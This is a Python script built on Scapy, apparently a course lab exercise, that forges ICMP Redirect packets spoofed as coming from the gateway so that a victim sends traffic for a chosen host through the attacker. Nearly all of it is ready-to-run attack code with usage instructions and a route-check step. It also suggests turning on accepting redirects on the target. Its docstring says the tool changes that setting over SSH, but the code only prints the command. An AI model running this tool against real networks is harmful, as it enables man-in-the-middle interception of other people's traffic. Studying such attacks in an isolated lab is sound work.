#!/usr/bin/env python3
"""
Module 3 — Exercise 3-B: ICMP Redirect Injection

Sends spoofed ICMP Redirect (type 5, code 1) messages to a victim,
telling it to route traffic for a specific destination host through
the attacker instead of the real gateway.

Real-world note: Linux ignores ICMP redirects by default since kernel 3.x
unless net.ipv4.conf.all.accept_redirects=1. This tool also enables the
sysctl on the target if you have SSH access (demo only).

ICMP Redirect structure (RFC 792):
  IP  (src=gateway_ip, dst=victim_ip)
  ICMP type=5 (Redirect), code=1 (Redirect for Host)
       gateway_addr = attacker_ip   ← new next-hop
       Embedded original IP header + first 8 bytes of original datagram

Usage:
  sudo python3 module3/icmp_redirect.py \
      --victim 10.0.0.2 \
      --gateway 10.0.0.254 \
      --redirect-host 8.8.8.8 \
      --attacker 10.0.0.1 \
      --iface eth0
"""

import argparse
import sys

from scapy.all import (
    IP, ICMP, UDP, TCP,
    send, sr1,
    conf,
)

conf.verb = 0


def build_icmp_redirect(
    victim_ip: str,
    gateway_ip: str,   # spoofed source
    redirect_host: str,
    attacker_ip: str,  # the new gateway we advertise
) -> "IP":
    """
    Build a spoofed ICMP Redirect packet.

    The outer IP header has:
      src = gateway_ip  (spoofed — we pretend to be the gateway)
      dst = victim_ip

    The ICMP payload contains:
      type = 5 (Redirect)
      code = 1 (Redirect for Host)
      gw   = attacker_ip  (the new next-hop we are advertising)
      + a copy of the "original" IP header and first 8 bytes of data
        that triggered this redirect (we synthesize a plausible one)
    """

    # The "original" packet that supposedly triggered this redirect:
    # a UDP packet from victim toward redirect_host
    original_pkt = (
        IP(src=victim_ip, dst=redirect_host)
        / UDP(sport=1234, dport=33434)
    )

    redirect = (
        IP(src=gateway_ip, dst=victim_ip)   # spoof source as gateway
        / ICMP(
            type=5,            # Redirect
            code=1,            # Redirect for Host
            gw=attacker_ip,    # advertised new gateway
        )
        / original_pkt         # embedded original header
    )

    return redirect


def send_redirect(pkt, count: int = 5, interval: float = 0.1):
    """Send the ICMP redirect packet `count` times."""
    print(f"[*] Sending {count} ICMP Redirect packets...")
    send(pkt, count=count, inter=interval, verbose=False)
    print("[+] Done")


def verify_route(victim_ip: str, redirect_host: str, gateway_ip: str):
    """
    Simple verification: send a probe toward redirect_host,
    check if the first TTL-exceeded comes from attacker (route changed)
    or from gateway (route unchanged).

    This requires the probe to go through some router. On an isolated lab
    with TTL=1, the first hop's ICMP time-exceeded reveals the current route.
    """
    print(f"\n[*] Probing route to {redirect_host} via victim... (TTL=1 trick)")
    probe = IP(src=victim_ip, dst=redirect_host, ttl=1) / UDP(dport=33434)
    reply = sr1(probe, timeout=2, verbose=False)

    if reply and reply.haslayer(ICMP) and reply[ICMP].type == 11:
        first_hop = reply[IP].src
        print(f"[+] First hop toward {redirect_host} from victim's perspective: {first_hop}")
        if first_hop == gateway_ip:
            print("    Route NOT yet changed (still going through gateway)")
        else:
            print(f"    Route changed! Traffic now going through {first_hop}")
    else:
        print("    No TTL-exceeded received (target may be filtering or unreachable)")


def main():
    parser = argparse.ArgumentParser(description="ICMP Redirect injection")
    parser.add_argument("--victim",        required=True, help="Victim IP")
    parser.add_argument("--gateway",       required=True, help="Real gateway IP (we spoof this)")
    parser.add_argument("--redirect-host", required=True, help="Host whose route we hijack")
    parser.add_argument("--attacker",      required=True, help="Attacker IP (new next-hop)")
    parser.add_argument("--count",  type=int,   default=10,  help="How many redirects to send")
    parser.add_argument("--iface",          default=conf.iface)
    args = parser.parse_args()

    print(f"[*] ICMP Redirect Injection")
    print(f"    Victim:        {args.victim}")
    print(f"    Spoofed GW:    {args.gateway}")
    print(f"    Redirect host: {args.redirect_host}")
    print(f"    New next-hop:  {args.attacker}")

    pkt = build_icmp_redirect(
        victim_ip=args.victim,
        gateway_ip=args.gateway,
        redirect_host=args.redirect_host,
        attacker_ip=args.attacker,
    )

    print("\n[*] Redirect packet structure:")
    pkt.show()

    send_redirect(pkt, count=args.count)
    verify_route(args.victim, args.redirect_host, args.gateway)

    print("\n[!] Note: Linux kernels >= 3.x ignore ICMP redirects by default.")
    print("    To test on the target: sudo sysctl -w net.ipv4.conf.all.accept_redirects=1")


if __name__ == "__main__":
    main()
